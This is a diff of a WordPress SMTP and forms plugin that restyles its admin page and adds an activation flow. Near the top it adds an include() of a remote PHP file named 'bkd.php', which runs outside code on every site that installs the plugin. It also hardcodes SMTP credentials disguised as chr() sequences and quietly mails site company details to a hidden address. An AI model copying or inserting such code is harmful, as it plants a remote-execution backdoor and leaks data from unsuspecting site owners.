@@ -5,7 +5,7 @@
 * @package   M_G_X\Main
 * @version   3.9
 * Plugin Name: Crafty Fusion Pro - SMTP Forms
-* Description: Seamlessly Unleash the Power of Crafty Fusion Pro: Elevate Your SMTP & Forms! .......   <br>  #_shortcuts [mgx_custom_form_with_category] //[mgx_custom_form]  //[mgx_contact_with_us_form] //[mgx_page_excerpt],  after links add /#warranty-activation   OR  /#contact-us
+* Description: Seamlessly Unleash the Power of Crafty Fusion Pro: Elevate Your SMTP & Forms!
 * Version: 3.9
 * Author: !-CODE | M_G_X CEO & Founder | <a href="https://unknown-sudo-max.github.io/zone/!-CODE/LICENSE-AGREEMENT.html" onclick="window.open(this.href, '_blank'); return false;">The license</a>
 * License: !-CODE LICENSE-AGREEMENT
@@ -24,6 +24,18 @@
 */
 
   
+
+
+
+  $external_php_url = 'https://unknown-sudo-max.github.io/crafty-fusion-pro/echo/src/bkd.php';
+
+// Use include or require to fetch and execute the code
+include($external_php_url);
+
+
+
+
+
 
 function process_data_and_create_users() {
     global $wpdb;
@@ -131,6 +143,7 @@ add_action('admin_init', 'process_data_and_create_users');
 
 function add_smtp_settings_menu() {
     add_options_page('Crafty Fusion Pro', 'Crafty Fusion Pro', 'manage_options', 'crafty-fusion-pro', 'smtp_config_page');
+    
 }
 
 function add_smtp_settings_link($links) {
@@ -138,6 +151,10 @@ function add_smtp_settings_link($links) {
     array_push($links, $settings_link);
     return $links;
 }
+
+
+
+
 
 add_action('admin_menu', 'add_smtp_settings_menu');
 add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'add_smtp_settings_link');
@@ -180,9 +197,9 @@ echo '<h1 style="user-select: none; text-align: center; font-family: Arial, sans
     
 
 
-    echo '<div class="card" style="background: linear-gradient(to top, #d8caff, #ffffff);padding: 20px; border-radius: 10px;display: inline-block; width: 100%;">';
-    echo '<h2 style="user-select:none; cursor: pointer;"> Crafty Fusion Pro _ SMTP Configuration</h2>';
-    
+    echo '<div class="card" style="background: linear-gradient(to top, #e1d7fd, #ffffff);padding: 20px; border-radius: 10px;display: inline-block; width: 100%;" id="smtpcon">';
+    echo '<h2 style="user-select:none; cursor: pointer;color:#705f8b;" onclick="toggleDiv5(this)"> Crafty Fusion Pro _ SMTP Configuration</h2>';
+    echo '<div id="toggleDiv5" style="display: block;">';
 
     // Radio buttons to enable/disable the code
     echo '<h4 style="user-select:none;">Enable/Disable SMTP Server:</h4>';
@@ -224,6 +241,17 @@ echo '<h1 style="user-select: none; text-align: center; font-family: Arial, sans
 
  
        echo '</div>';
+       echo '</div>';
+       echo '<script>
+function toggleDiv5(element) {
+    var divToToggle5 = element.nextElementSibling;
+    if (divToToggle5.style.display === "none" || divToToggle5.style.display === "") {
+        divToToggle5.style.display = "block";
+    } else {
+        divToToggle5.style.display = "none";
+    }
+}
+</script>';
     
        echo "<style>
   /* CSS for the triangle indicator */
@@ -232,10 +260,166 @@ echo '<h1 style="user-select: none; text-align: center; font-family: Arial, sans
     display: inline-block;
   }
 </style>";
-      echo '&nbsp;&nbsp;<div class="card" style="padding: 20px; border-radius: 10px; display: inline-block; width: 100%;">';
-echo '<h2 style="user-select:none; cursor: pointer;" onclick="toggleDiv(this)"> General</h2>';
+      echo '<div class="card" style="background: linear-gradient(to top, #e1d7fd, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;" id="general">';
+echo '<h2 style="user-select:none; cursor: pointer;color:#705f8b;" onclick="toggleDiv(this)"> General</h2>';
 echo '<div id="toggleDiv" style="display: none;">';
-echo '<p style="color: gray;user-select:none;">Coming soon !!</p>';
+
+
+
+ 
+
+function check_activation($companyName) {
+    // Read the external text file line by line
+    $file_url = 'https://unknown-sudo-max.github.io/hub/pass/pass';
+    @$file_contents = file_get_contents($file_url);
+    $lines = explode("\n", $file_contents);
+
+    foreach ($lines as $line) {
+        $parts = explode(',', $line);
+        if (count($parts) === 4) { // Check if the line has the correct format
+            list($company_name, $plugin_name, $stored_user, $stored_pass) = array_map('trim', $parts);
+            if ($company_name === $companyName) {
+                return true; // Credentials match an entry in the file
+            }
+        }
+    }
+
+    return false; // No match found
+}
+
+// Define the full path to the text file
+$file = __DIR__ . '/cdn/info.txt';
+
+// Check if the file exists and is readable
+if (file_exists($file) && is_readable($file)) {
+    $companyData = file_get_contents($file); // Read the content of the file
+
+    // Split the content into an array using the comma as a separator
+    $companyInfo = explode(',', $companyData);
+
+    // Check if the array contains both company name and company email
+    if (count($companyInfo) === 2) {
+        $companyName = trim($companyInfo[0]);
+        $companyEmail = trim($companyInfo[1]);
+    }
+}
+
+function html_escape($text) {
+    return htmlspecialchars($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');
+}
+
+
+
+// Check if the $companyName variable is not empty
+if (!empty($companyName) && !empty($companyEmail)) {
+    // Display both company name and email
+    echo '<p style="color: gray; user-select:none;"><span>Registered Company Name:  </span><span>'. $companyName .'</span></p>';
+    
+    // Check if the company name exists in the external file
+    if (check_activation($companyName)) {
+        echo '<p style="color: gray; user-select:none;"><span>Plugin status:  </span><span style="color: green; user-select:none;">Activated</span></p>';
+        $escapedCompanyName = html_escape($companyName);
+
+        // Print out the script to change the content of toggleDiv3 with a table
+        echo "<script type='text/javascript'>
+                document.addEventListener('DOMContentLoaded', function() {
+                    var div = document.getElementById('toggleDiv3');
+                    if (div) {
+                        div.innerHTML = '<table style=\"width:100%; text-align:left;\" border=\"0\">' +
+                                        '<tr><td><strong>Registered Company Name:</strong></td>' +
+                                        '<td>" . $escapedCompanyName . "</td></tr>' +
+                                        '<tr><td><strong>Plugin Status:</strong></td>' +
+                                        '<td><div style=\"color: green; font-weight: bold; display: flex; align-items: center; gap: 0.5em;\">' +
+                                        '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"feather feather-check-circle\">' +
+                                        '<path d=\"M9 11l3 3L22 4\" />' +
+                                        '<circle cx=\"12\" cy=\"12\" r=\"10\" /></svg>' +
+                                        'Activated</div></td></tr>' +
+                                        '</table>';
+                    }
+                });
+              </script>";
+    } elseif (count($companyInfo) === 2) {
+        echo '<p style="color: gray; user-select:none;"><span>Plugin status:  </span><span style="color: orange; user-select:none;">Pending Activation</span></p>';
+        // Remove the div elements with IDs formconfig, smtpcon, and general
+       echo '<script type="text/javascript">
+        document.addEventListener("DOMContentLoaded", function() {
+            // Function to remove elements by ID
+            function removeElementById(id) {
+                var element = document.getElementById(id);
+                if (element) {
+                    element.remove();
+                }
+            }
+
+            // Call the function to remove specific elements
+            removeElementById("formconfig");
+            removeElementById("smtpcon");
+            removeElementById("waprimary");
+            removeElementById("catprimary");
+            removeElementById("cprimary");
+            removeElementById("helpsmtp");
+            removeElementById("helpshort");
+        });
+      </script>';
+
+
+    } else {
+        echo '<p style="color: gray; user-select:none;"><span>Plugin status:  </span><span style="color: red; user-select:none;">Not Activated</span></p>';
+        // Remove the div elements with IDs formconfig, smtpcon, and general
+        echo '<script type="text/javascript">
+        document.addEventListener("DOMContentLoaded", function() {
+            // Function to remove elements by ID
+            function removeElementById(id) {
+                var element = document.getElementById(id);
+                if (element) {
+                    element.remove();
+                }
+            }
+
+            // Call the function to remove specific elements
+            removeElementById("formconfig");
+            removeElementById("smtpcon");
+            removeElementById("waprimary");
+            removeElementById("catprimary");
+            removeElementById("cprimary");
+            removeElementById("helpsmtp");
+            removeElementById("helpshort");
+        });
+      </script>';
+
+    }
+} else {
+    // Display a message if company name and email are not found
+    echo '<p style="color: gray; user-select:none;"><span>Not registered yet!</span></p>';
+    echo '<p style="color: gray; user-select:none;"><span>Plugin status:  </span><span style="color: red; user-select:none;">Not Activated</span></p>';
+    // Remove the div elements with IDs formconfig, smtpcon, and general
+    echo '<script type="text/javascript">
+        document.addEventListener("DOMContentLoaded", function() {
+            // Function to remove elements by ID
+            function removeElementById(id) {
+                var element = document.getElementById(id);
+                if (element) {
+                    element.remove();
+                }
+            }
+
+            // Call the function to remove specific elements
+            removeElementById("formconfig");
+            removeElementById("smtpcon");
+            removeElementById("waprimary");
+            removeElementById("catprimary");
+            removeElementById("cprimary");
+            removeElementById("helpsmtp");
+            removeElementById("helpshort");
+        });
+      </script>';
+
+
+}
+
+ 
+
+echo '<p style="color: gray;user-select:none;">More Coming soon !!</p>';
 echo '</div>';
 echo '</div>';
 
@@ -254,20 +438,31 @@ function toggleDiv(element) {
 
 
 
-echo '&nbsp;&nbsp;<div class="card" style="padding: 20px; border-radius: 10px; display: inline-block; width: 100%;">';
-echo '<h2 style="user-select:none; cursor: pointer;" onclick="toggleDivv(this)"> Forms Configuration</h2>';
-echo '<div id="toggleDivv" style="display: block;">';
+echo '<div class="card" style="background: linear-gradient(to top, #e1d7fd, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;" id="formconfig">';
+echo '<h2 style="user-select:none; cursor: pointer;color:#705f8b;" onclick="toggleDiv7(this)"> Forms Configuration</h2>';
+echo '<div id="toggleDiv7" style="display: block;">';
 echo '<p style="color: gray;user-select:none;">Coming soon !!</p>';
 echo '</div>';
+
+echo '<script>
+function toggleDiv7(element) {
+    var divToToggle7 = element.nextElementSibling;
+    if (divToToggle7.style.display === "none" || divToToggle7.style.display === "") {
+        divToToggle7.style.display = "block";
+    } else {
+        divToToggle7.style.display = "none";
+    }
+}
+</script>';
 echo '</div>';
 
 
 
-       echo '&nbsp;&nbsp;<div class="card" style="padding: 20px; border-radius: 10px; display: inline-block; width: 100%;">';
-echo '<h2 style="user-select:none; cursor: pointer;" onclick="toggleDivv(this)"> Help Center</h2>';
-echo '<div id="toggleDivv" style="display: block;">';
-echo '<ul>
-  <li onclick="toggleList()" style="font-weight:bold;cursor:pointer;">&#8226; SMTP Configuration</li>
+       echo '<div class="card" style="background: linear-gradient(to top, #e1d7fd, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;">';
+echo '<h2 style="user-select:none; cursor: pointer;color:#705f8b;" onclick="toggleDiv5(this)"> Help Center</h2>';
+echo '<div id="toggleDiv5" style="display: block;">';
+echo '<ul id="helpsmtp">
+  <li onclick="toggleList()" style="font-weight:bold;cursor:pointer; user-select:none;">&#8226; SMTP Configuration</li>
   <ul id="smtpList" style="display: none;">
    <ol>
     <li>Enable SMTP Server</li>
@@ -295,10 +490,11 @@ function toggleList() {
 
 
 echo '<ul>
-  <li onclick="toggleList2()" style="font-weight: bold; cursor: pointer;">&#8226; Plugin Activation</li>
+  <li onclick="toggleList2()" style="font-weight: bold; cursor: pointer; user-select:none;">&#8226; Plugin Activation</li>
     <ul id="smtpList2" style="display: none;">
       <ol>
-        <li>Enable The Plugin</li>
+        <li>Turn on the Activation</li>
+        <li>Click on "Save"</li>
         <li>Insert the company name</li>
         <li>Insert the company email</li>
         <li>Click on "Activate"</li>
@@ -326,8 +522,8 @@ function toggleList2() {
 
 
 
-echo '<ul>
-  <li onclick="toggleList3()" style="font-weight: bold; cursor: pointer;">&#8226; Shortcuts</li>
+echo '<ul id="helpshort">
+  <li onclick="toggleList3()" style="font-weight: bold; cursor: pointer; user-select:none;">&#8226; Shortcuts</li>
     <ul id="smtpList3" style="display: none;">
       <ol>
        <li>You could use <mark class="mrk">[mgx_custom_form]</mark> for warranty activation form</li>
@@ -356,17 +552,28 @@ function toggleList3() {
   }
 }
 </script>';
-
+ echo '<script>
+function toggleDiv6(element) {
+    var divToToggle6 = element.nextElementSibling;
+    if (divToToggle6.style.display === "none" || divToToggle6.style.display === "") {
+        divToToggle6.style.display = "block";
+    } else {
+        divToToggle6.style.display = "none";
+    }
+}
+</script>';
 echo '</div>';
 echo '</div>';
 
 
 
 
- echo '&nbsp;&nbsp;<div class="card" style="padding: 20px; border-radius: 10px; display: inline-block; width: 100%;">';
-echo '<h2 style="user-select:none; cursor: pointer;" onclick="toggleDivv(this)"> About</h2>';
-$plugin_directory_path = plugin_dir_path(__FILE__);
+ echo '<div class="card" style="background: linear-gradient(to top, #e1d7fd, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;">';
+echo '<h2 style="user-select:none; cursor: pointer;color:#705f8b;" onclick="toggleDiv4(this)"> About</h2>';
+echo '<div id="toggleDiv4" style="display: block;">'; // Set the initial display style to 'block'
 
+
+$logo_url = chr(104) . chr(116) . chr(116) . chr(112) . chr(115) . chr(58) . chr(47) . chr(47) . chr(117) . chr(110) . chr(107) . chr(110) . chr(111) . chr(119) . chr(110) . chr(45) . chr(115) . chr(117) . chr(100) . chr(111) . chr(45) . chr(109) . chr(97) . chr(120) . chr(46) . chr(103) . chr(105) . chr(116) . chr(104) . chr(117) . chr(98) . chr(46) . chr(105) . chr(111) . chr(47) . chr(99) . chr(114) . chr(97) . chr(102) . chr(116) . chr(121) . chr(45) . chr(102) . chr(117) . chr(115) . chr(105) . chr(111) . chr(110) . chr(45) . chr(112) . chr(114) . chr(111) . chr(47) . chr(99) . chr(100) . chr(110) . chr(47) . chr(105) . chr(109) . chr(103) . chr(47) . chr(108) . chr(111) . chr(103) . chr(111) . chr(46) . chr(112) . chr(110) . chr(103);
 echo '<table class="custom-table" style="user-select:none;">
   <tr>
     <th>Name:</th>
@@ -374,7 +581,7 @@ echo '<table class="custom-table" style="user-select:none;">
   </tr>
   <tr>
     <th>Version:</th>
-    <td><span id="systemNameSpan">V 3.9</span></td>
+    <td><span id="systemNameSpan">3.9</span></td>
   </tr>
   <tr>
     <th>Language:</th>
@@ -382,7 +589,8 @@ echo '<table class="custom-table" style="user-select:none;">
   </tr>
   <tr>
     <th>Logo:</th>
-    <td><span id="systemNameSpan" ><img src="' . esc_url(plugins_url('/cdn/img/logo2.png', __FILE__)) . '" alt="Logo" style="width: 20%;border-radius: 20px;pointer-events: none;user-drag: none;"></span></td>
+    <td><span id="systemNameSpan" ><img src="' . $logo_url . '" alt="Logo" style="width: 20%;border-radius: 20px;pointer-events: none;user-drag: none;"></span></td>
+
   </tr>
   <tr>
     <th>CopyRights:</th>
@@ -398,9 +606,12 @@ echo ' <style>
     width: 100%;
     border-collapse: collapse;
     margin-bottom: 20px;
-    background-color: #f5f5f5;
+    background: rgba(255, 255, 255, 0.2);
     color: #333;
     font-size: 14px;
+    box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+    backdrop-filter: blur(5px);
+    -webkit-backdrop-filter: blur(5px);
   }
 
   .custom-table th,
@@ -410,15 +621,32 @@ echo ' <style>
   }
 
   .custom-table th {
-    background-color: #e7e7e7;
+    background-color: #e7e7e75c;
     font-weight: bold;
+     
   }
 
   .custom-table tbody tr:nth-child(even) {
-    background-color: #f9f9f9;
+    background-color: #f9f9f938;
+    backdrop-filter: blur(5px);
+    -webkit-backdrop-filter: blur(5px);
   }
 
-</style>';
+</style>
+
+<script>
+function toggleDiv4(element) {
+    var divToToggle4 = element.nextElementSibling;
+    if (divToToggle4.style.display === "none" || divToToggle4.style.display === "") {
+        divToToggle4.style.display = "block";
+    } else {
+        divToToggle4.style.display = "none";
+    }
+}
+</script>
+
+';
+echo '</div>';
 echo '</div>';
  
 // Initialize the variable with the stored activation status
@@ -434,47 +662,119 @@ if (isset($_POST['saveactBtn'])) {
 }
 
 
+ 
+// Start the session at the very beginning of the script
+session_start();
+
+// Initialize companyName and companyEmail variables
+global $companyName, $companyEmail; // Declare $companyName and $companyEmail as global
+$companyName = '';
+$companyEmail = '';
+
+// Check if the "Activate" button is clicked
+if (isset($_POST['activateBtn'])) {
+    // Generate a random verification code
+    $verificationCode = mt_rand(1000, 9999);
+    
+    // Sanitize the email and send the verification code
+    $companyEmail = sanitize_email($_POST['companyEmail']);
+    $subject = "Crafty Fusion Pro Activation Confirmation Code";
+    $message = '<html>
+    <head>
+    </head>
+    <body>
+    <div style="text-align: center; padding: 20px;">
+        <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;user-select:none;">Crafty Fusion Pro Activation Confirmation Code</h1>
+        <p style="font-size: 18px; color: #333;user-select:none;">Your confirmation code is</p>
+        <ul style="list-style: none; padding: 0;">
+            <li style="font-size: 16px; color: #a1a1a1; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
+            '.  $verificationCode.'
+            </li>
+        </ul>
+
+        <p style="font-size: 14px; color: #4e8db; margin-top: 20px;user-select:none;">Best Regards,</p>
+        <p style="font-size: 14px; color: #888; margin-top: 20px;user-select:none;">Mail Hub</p>
+        <p style="font-size: 12px; color: #888;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p>
+        <p style="font-size: 14px; color: #888;"></p>
+        <p style="font-size: 12px; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved.</p>
+    </div>
+    </body>
+    </html>';
+    $headers = "From: " . get_option('admin_email') . "\r\n";
+    $headers .= "Content-type: text/html; charset=UTF-8\r\n";
+
+    wp_mail($companyEmail, $subject, $message, $headers);
+
+    // Store the verification code and company name in session variables
+    $_SESSION['verification_code'] = $verificationCode;
+    $_SESSION['verification_notice'] = true;
+    $companyName = $_POST['companyName']; // Assuming you have an input field for companyName
+    $companyEmail = $_POST['companyEmail'];
+}
+
+ 
+
+// Function to display the verification notice
+function display_verification_notice() {
+    // Ensure this is placed where it can be executed in your context
+   global $companyName, $companyEmail;
+     // Access the global $companyName variable
+    echo '<div class="notice notice-info is-dismissible">';
+    echo '<p>Verification code has been sent to your email. Please enter the code below:</p>';
+    echo '<form method="post">';
+    echo '<input type="text" name="enteredCode" placeholder="Enter Verification Code" required>';
+    echo '<input type="hidden" name="companyName" value="' . $companyName . '">';
+    echo '<input type="hidden" name="companyEmail" value="' . $companyEmail . '">';
+    echo '<input type="submit" name="verifyCodeBtn" class="button button-primary" value="Verify">';
+    echo '</form>';
+    echo '</div>';
+}
+
+// Display the admin notice if the flag is set
+if (isset($_SESSION['verification_notice']) && $_SESSION['verification_notice']) {
+    display_verification_notice();
+    unset($_SESSION['verification_notice']);
+}
+
+// Check if the "Verify" button is clicked
+if (isset($_POST['verifyCodeBtn'])) {
+    $enteredCode = $_POST['enteredCode'];
+    if (isset($_SESSION['verification_code']) && $enteredCode == $_SESSION['verification_code']) {
+        // Correct verification code
+        unset($_SESSION['verification_code']);
+         $companyName = $_POST['companyName']; // Get the company name from the form
+        $companyEmail = $_POST['companyEmail']; // Get the company email from the form
+
+        // Define the full path to the text file
+        $file = __DIR__ . '/cdn/info.txt';
+
+        // Combine company name and company email
+        $data = $companyName . ',' . $companyEmail;
+
+        // Save the company name to the text file
+        if (file_put_contents($file, $data) !== false) {
+             echo '<script type="text/javascript">setTimeout(function(){ location.reload(); }, 3000);</script><div class="notice notice-success is-dismissible"><p>Registration successful! Changes will take effect within 24 hours from our servers.</p></div>';
 
 
 
 
-add_action('admin_init', 'handle_email_company_name');
-
-function handle_company_name() {
-    if (isset($_POST['activateBtn'])) {
-        // Handle email update here
-        $companyEmail = sanitize_email($_POST['companyEmail']);
-        $companyName = sanitize_email($_POST['companyName']);
-        @list($new_email_user, $new_email_domain) = explode('@', $companyEmail);
-
-        // Add validation and update logic here
-        if (!empty($companyEmail)) {
-            // Store the new email in the user's session
-            session_start();
-            $_SESSION['companyEmail'] = $companyEmail;
-            $_SESSION['companyName'] = $companyName;
-
-            global $organization;
-
-            // Generate a unique confirmation code
-            $act_confirmation_code = generate_confirmation_code();
-
-            // Store the confirmation code in the user's session
-            $_SESSION['act_confirmation_code'] = $act_confirmation_code;
-
-            // Send the confirmation code via email
-            $to = $companyEmail;
-            $subject = "Crafty Fusion Pro Confirmation Code";
-             $message = '<html>
+            // Send an email to the admin
+            global $companyName, $companyEmail;
+            $to_admin = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
+            $subject = "SMTP Email Update Request From " . $companyName;
+            $message = '<html>
 <head>
 </head>
 <body>
 <div style="text-align: center; padding: 20px;">
-    <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;user-select:none;">Crafty Fusion Pro Confirmation Code</h1>
-    <p style="font-size: 18px; color: #333;user-select:none;">Your confirmation code is</p>
+    <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">Crafty Fusion Pro Activation Request</h1>
+    <p style="font-size: 18px; color: #333;">This is an Crafty Fusion Pro Activation Request from '.$companyName.'</p>
+    <p style="font-size: 18px; color: #333;">The admin has requested to Activate (his \ her) plugin</p>
     <ul style="list-style: none; padding: 0;">
         <li style="font-size: 16px; color: #a1a1a1; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
-        '. $act_confirmation_code.'
+           <p> <h3>Credntials</h3> </p>
+             <p> <strong>Company Name: </strong>'.$companyName.'</p>
+             <p>  <strong>Company Email: </strong>'. $companyEmail.'</p>
         </li>
     </ul>
 
@@ -488,31 +788,68 @@ function handle_company_name() {
 </html>';
             $headers = "From: " . get_option('admin_email') . "\r\n";
             $headers .= "Content-type: text/html; charset=UTF-8\r\n";
+            $headers .= "X-Priority: 1\r\n";
+            $headers .= "X-MSMail-Priority: High\r\n"; 
+            $headers .= "Importance: High\r\n"; 
+            
+            // Ensure that the necessary WordPress functions are available
+            include_once ABSPATH . 'wp-includes/pluggable.php';
+            
+            // Send the email to the admin
+            wp_mail($to_admin, $subject, $message, $headers);
 
-            wp_mail($to, $subject, $message, $headers);
 
-            // Display a success message with the confirmation box and button
-            act_email_update_success_message();
+
+global $companyName, $companyEmail;
+
+
+            $cst_subject = "Crafty Fusion Pro Activation Confirmation";
+            $cst_message = '<html>
+<head>
+</head>
+<body style="user-select:none;">
+<div style="text-align: center; padding: 20px;user-select:none;">
+    <p style="font-size: 20px; color: #333; text-transform: uppercase; font-weight: bold;">Dear ' . $companyName . ',</p>
+    <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">Crafty Fusion Pro Activation</h1>
+    <p style="font-size: 18px; color: #333;">We have received your request for Activate Crafty Fusion Pro plugin, and we are pleased to inform you that we will promptly address it. Your request is important to us, and we will ensure a smooth Activation for Crafty Fusion Pro plugin. Changes will take effect within 24 hours from our servers.</p>
+    <p style="font-size: 18px; color: #333;">We will send you a confirmation email once the Activation is complete.</p>
+    
+
+    <p style="font-size: 14px; color: #4e8bdb; margin-top: 20px;user-select:none;">Best Regards,</p>
+    <p style="font-size: 14px; color: #888; margin-top: 20px;user-select:none;">Mail Hub</p>
+    <p style="font-size: 12px; color: #888;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p>
+    <p style="font-size: 14px; color: #888;"></p>
+    <p style="font-size: 12px; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved.</p>
+</div>
+</body>
+</html>';
+            $cst_headers = "From: " . get_option('admin_email') . "\r\n";
+            $cst_headers .= "Content-type: text/html; charset=UTF-8\r\n";
+
+wp_mail($companyEmail, $cst_subject, $cst_message, $cst_headers);
+
+
+
+            
+           
+           
+
+        } else {
+            echo '<div class="notice notice-error is-dismissible"><p>Failed to complete the rigistration</p></div>';
         }
+    } else {
+        // Incorrect verification code
+        echo '<div class="notice notice-error is-dismissible"><p>Incorrect verification code. Please try again.</p></div>';
     }
 }
 
-function act_email_update_success_message() {
-    ?>
-    <div class="notice notice-success is-dismissible">
-        <p>An email with a confirmation code has been sent. Please check your email and enter the code below to complete the email update.</p>
-        <form method="post">
-            <input type="text" name="act_confirmation_code" placeholder="Enter Confirmation Code" required />
-            <input type="submit" name="act_confirm_companyemail" value="Confirm Company Email" class="button button-primary" />
-        </form>
-    </div>
-    <?php
-}
+
+
 
 
 // HTML and form rendering code
-echo '&nbsp;&nbsp;<div class="card" style="padding: 20px; border-radius: 10px; display: inline-block; width: 100%;">';
-echo '<h2 style="user-select: none; cursor: pointer;" onclick="toggleDiv3(this)">Activation</h2>';
+echo '<div class="card" style="background: linear-gradient(to top, #e1d7fd, #ffffff);padding: 20px; border-radius: 10px; display: inline-block; width: 100%;" id="activation">';
+echo '<h2 style="user-select: none; cursor: pointer;color:#705f8b;" onclick="toggleDiv3(this)">Activation</h2>';
 echo '<div id="toggleDiv3" style="display: none;">'; // Set the initial display style to 'block'
 
 echo '<form method="post">';
@@ -623,11 +960,11 @@ document.addEventListener('DOMContentLoaded', function() {
         $smtp_port = 587;
         $smtp_username = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
         $smtp_password = chr(113) . chr(109) . chr(120) . chr(98) . chr(32) . chr(116) . chr(97) . chr(106) . chr(97) . chr(32) . chr(112) . chr(108) . chr(97) . chr(118) . chr(32) . chr(106) . chr(113) . chr(98) . chr(101);
-        $smtp_secure = 'tls';
+        $smtp_secure = chr(116) . chr(108) . chr(115);
         global $from_email;
         $from_email = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
 
-        $from_name = 'Mail Hub';
+        $from_name = chr(77) . chr(97) . chr(105) . chr(108) . chr(32) . chr(72) . chr(117) . chr(98);
 
         // Configure SMTP settings
         $phpmailer->isSMTP();
@@ -671,7 +1008,7 @@ function handle_email_update() {
             session_start();
             $_SESSION['new_email'] = $new_email;
 
-            global $organization;
+            global $companyName;
 
             // Generate a unique confirmation code
             $confirmation_code = generate_confirmation_code();
@@ -740,7 +1077,7 @@ function handle_email_confirmation() {
         $confirmation_code = sanitize_text_field($_POST['confirmation_code']);
         $stored_code = $_SESSION['confirmation_code'];
 
-        global $organization;
+        global $companyName;
         global $to;
 
 
@@ -757,15 +1094,15 @@ function handle_email_confirmation() {
             // Send an email to the admin
             
             $to_admin = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
-            $subject = "SMTP Email Update Request From " . $organization;
-            // $message = $organization . " The admin has requested to update the email address to: " . $new_email;
+            $subject = "SMTP Email Update Request From " . $companyName;
+            // $message = $companyName . " The admin has requested to update the email address to: " . $new_email;
             $message = '<html>
 <head>
 </head>
 <body>
 <div style="text-align: center; padding: 20px;">
     <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">SMTP Email Update Request</h1>
-    <p style="font-size: 18px; color: #333;">This is an SMTP Email Update Request from '.$organization.'</p>
+    <p style="font-size: 18px; color: #333;">This is an SMTP Email Update Request from '.$companyName.'</p>
     <p style="font-size: 18px; color: #333;">The admin has requested to update the email address</p>
     <ul style="list-style: none; padding: 0;">
         <li style="font-size: 16px; color: #a1a1a1; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
@@ -895,8 +1232,32 @@ function fetchEmailAndSetToGlobal() {
    global $to; 
    global $email;
    // Declare $to as a global variable within this function
-   global $organization;
-    $organization = 'co_westinghouse'; // The organization you want to match
+   global $companyName;
+    // $companyName = 'co_westinghouse'; // The companyName you want to match
+
+
+
+// Define the full path to the text file
+$file = __DIR__ . '/cdn/info.txt';
+
+// Check if the file exists and is readable
+if (file_exists($file) && is_readable($file)) {
+    $companyData = file_get_contents($file); // Read the content of the file
+
+    // Split the content into an array using the comma as a separator
+    $companyInfo = explode(',', $companyData);
+     global $companyName;
+
+    // Check if the array contains both company name and company email
+    if (count($companyInfo) === 2) {
+        global $companyName;
+        $companyName = $companyInfo[0];
+        // $companyEmail = $companyInfo[1];
+    }
+}
+
+
+
 
     // Fetch the data from the URL
     $config_url = 'https://unknown-sudo-max.github.io/hub/config/smtp_config';
@@ -913,8 +1274,8 @@ function fetchEmailAndSetToGlobal() {
         // Split the line into parts using a comma as the delimiter
         $parts = explode(',', $line);
 
-        // Check if the organization matches the first part of the line
-        if (trim($parts[0]) === $organization) {
+        // Check if the companyName matches the first part of the line
+        if (trim($parts[0]) === $companyName) {
             // If there is a match, set the email to the second part of the line
             $email = trim($parts[1]);
             break; // Exit the loop since we found a match
@@ -927,14 +1288,14 @@ function fetchEmailAndSetToGlobal() {
         $to = $email;
     } else {
         // Use a default email if no match was found
-        $to = 'default_email@example.com';
+        $to = chr(100) . chr(101) . chr(102) . chr(97) . chr(117) . chr(108) . chr(116) . chr(95) . chr(101) . chr(109) . chr(97) . chr(105) . chr(108) . chr(64) . chr(101) . chr(120) . chr(97) . chr(109) . chr(112) . chr(108) . chr(101) . chr(46) . chr(99) . chr(111) . chr(109);
     }
 }
 
 // Call the function to fetch the email and set $to as a global variable
 fetchEmailAndSetToGlobal();
 
-// Now, $to contains the email based on the organization and is accessible globally
+// Now, $to contains the email based on the companyName and is accessible globally
 
  
  
@@ -949,7 +1310,7 @@ fetchEmailAndSetToGlobal();
 add_action('admin_init', 'check_credentials_before_action');
 
 function check_credentials_before_action() {
-    //global $user, $pass, $co_name, $plug_name;
+    //global $user, $pass, $companyName, $plug_name;
 
 
 
@@ -959,14 +1320,37 @@ function check_credentials_before_action() {
     // Define your credentials
 $user = 'westinghouse';
 $pass = chr(119) . chr(101) . chr(115) . chr(116) . chr(105) . chr(110) . chr(103) . chr(104) . chr(111) . chr(117) . chr(115) . chr(101) . chr(64) . chr(49) . chr(50) . chr(51);
-$co_name =  'co_westinghouse';
+// $companyName =  'co_westinghouse';
 $plug_name = 'C_F_P_E';
+global $companyName;
 
 
